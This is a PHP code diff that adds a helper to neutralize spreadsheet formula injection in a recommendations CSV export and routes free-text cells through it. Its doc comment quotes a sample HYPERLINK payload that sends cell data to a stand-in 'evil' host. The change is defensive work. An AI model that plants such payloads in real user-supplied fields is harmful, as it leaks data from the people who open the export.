@@ -146,6 +146,27 @@ class Controller_Recommendations extends Controller
         exit;
     }
 
+    /**
+     * Neutralize spreadsheet formula injection in a CSV cell.
+     *
+     * Recommendation reasons and personas are written by ordinary players, not
+     * officers. Excel / Sheets / LibreOffice treat a cell starting with = + - @
+     * (or a leading tab / CR, which they strip before re-testing) as a FORMULA,
+     * so `=HYPERLINK("http://evil/?"&A1,"x")` in a reason would execute in the
+     * officer's spreadsheet when they open the export. fputcsv() only handles CSV
+     * quoting, which does not stop this. Prefixing a single quote makes the cell
+     * inert text; it is the standard mitigation and is invisible in every major
+     * spreadsheet app.
+     */
+    private function csvSafe($v)
+    {
+        $v = (string)$v;
+        if ($v !== '' && strpbrk(substr($v, 0, 1), "=+-@\t\r") !== false) {
+            return "'" . $v;
+        }
+        return $v;
+    }
+
     // Route: ?Route=Recommendations/export/kingdom/{id} or /export/park/{id}  (GET: same filters as rows)
     // Streams the FULL current filtered/sorted set (not paged) as a CSV download.
     public function export($context = null, $id = null)
@@ -224,20 +245,24 @@ class Controller_Recommendations extends Controller
                 }
             }
 
+            // Every free-text cell here originates with a player (persona, reason,
+            // recommender names) or an officer (award/park/court names), so all of
+            // them go through csvSafe(); the numeric and Yes/No cells cannot carry a
+            // formula trigger.
             fputcsv($out, [
-                $g['Persona'] ?? '',
-                $parkName,
-                $g['AwardName'] ?? '',
-                $rankLabel,
-                implode('; ', array_keys($names)),
+                $this->csvSafe($g['Persona'] ?? ''),
+                $this->csvSafe($parkName),
+                $this->csvSafe($g['AwardName'] ?? ''),
+                $this->csvSafe($rankLabel),
+                $this->csvSafe(implode('; ', array_keys($names))),
                 $g['OldestDate'] ?? '',
                 (int)($g['OldestAgeDays'] ?? 0),
                 (int)($g['SupportCount'] ?? 0),
                 !empty($g['AlreadyHas']) ? 'Yes' : 'No',
                 !empty($g['IsSnoozed']) ? 'Yes' : 'No',
                 !empty($g['PassedToLocal']) ? 'Yes' : 'No',
-                implode('; ', array_keys($courtNames)),
-                $g['Members'][0]['Reason'] ?? '',
+                $this->csvSafe(implode('; ', array_keys($courtNames))),
+                $this->csvSafe($g['Members'][0]['Reason'] ?? ''),
             ]);
         }
         fclose($out);
